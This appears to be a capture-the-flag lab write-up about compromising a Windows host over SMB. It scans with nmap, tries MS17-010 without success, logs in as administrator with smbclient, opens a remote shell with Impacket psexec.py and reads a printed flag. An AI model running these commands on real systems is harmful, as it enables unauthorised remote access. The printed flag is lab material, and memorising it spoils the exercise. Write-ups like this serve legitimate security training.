# SMB Admin Access → PsExec (Windows)

## Target
10.129.35.38  
OS: Windows  

---

## Enumeration

### Nmap

```bash
nmap -sC -sV 10.129.35.38

Open Ports:

135 → MSRPC
139 → NetBIOS
445 → SMB

SMB (445) identified as primary attack surface.

Initial Assessment

SMB is commonly associated with critical vulnerabilities such as EternalBlue (MS17-010).

Attempted detection using Metasploit:

No success
Target likely patched

Decision: move to authentication-based enumeration.

SMB Enumeration:

smbclient -L //10.129.35.38 -U "administrator"

Authentication succeeded.

Available shares:

ADMIN$
C$
IPC$

Presence of administrative shares indicates high privilege access.

Exploitation:

SMB Access (Impacket)
smbclient.py administrator@10.129.35.38

Interactive access confirmed.

Remote Command Execution
psexec.py administrator@10.129.35.38

Successful shell obtained.

Post-Exploitation:

cd C:\Users\Administrator\Desktop\
dir
type flag.txt

Flag:

f751c19eda8f61ce81827e6930a1f40c

Key Takeaways:

SMB enumeration should include authentication testing early
Patched systems may still be vulnerable through misconfiguration
Valid credentials can provide direct administrative access without exploits
Impacket tools are effective for SMB-based lateral movement and execution

Tools Used:

Nmap
smbclient
Impacket (smbclient.py, psexec.py)
Metasploit (initial check)

Notes:

Initial focus on vulnerability exploitation (MS17-010) was unsuccessful.
Pivoting to credential-based access led to successful compromise.

This highlights the importance of adapting methodology during testing.
